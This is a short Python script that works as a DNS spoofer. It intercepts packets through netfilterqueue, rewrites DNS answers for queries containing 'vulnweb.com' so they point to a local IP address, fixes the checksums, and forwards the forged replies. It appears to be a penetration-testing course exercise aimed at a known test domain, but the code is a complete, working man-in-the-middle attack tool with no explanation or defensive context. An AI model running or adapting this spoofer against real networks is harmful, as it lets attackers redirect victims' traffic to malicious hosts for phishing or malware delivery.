# !/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        queryname = str(scapy_packet[scapy.DNSQR].qname)
        print(queryname)
        if "vulnweb.com" in queryname:
            print("[+] Spoofing target")
            scapy_packet[scapy.DNS].an = scapy.DNSRR(rrname=queryname, rdata="192.168.1.25")
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
